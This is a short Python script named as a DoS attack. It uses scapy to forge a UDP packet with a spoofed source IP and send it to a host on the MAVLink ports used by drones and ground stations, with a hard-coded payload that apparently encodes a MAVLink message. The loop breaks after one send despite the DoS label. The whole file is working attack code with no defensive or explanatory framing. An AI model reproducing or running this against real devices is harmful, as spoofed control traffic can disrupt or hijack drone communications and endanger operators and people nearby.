# -*- coding: utf-8 -*-
# time : 2022/12/11 21:33
# file : dos攻击.py
# author : erchen
# description :

from scapy.all import *
import time

data = b"\xfe\x06\xff\xff\xbe\x42\x02\x00\x01\x01\x01\x01\x1b\xa0"

while True:
    send(IP(src='192.168.1.148', dst='192.168.1.123') / UDP(sport=14550, dport=14555) / data)
    time.sleep(1)

    break
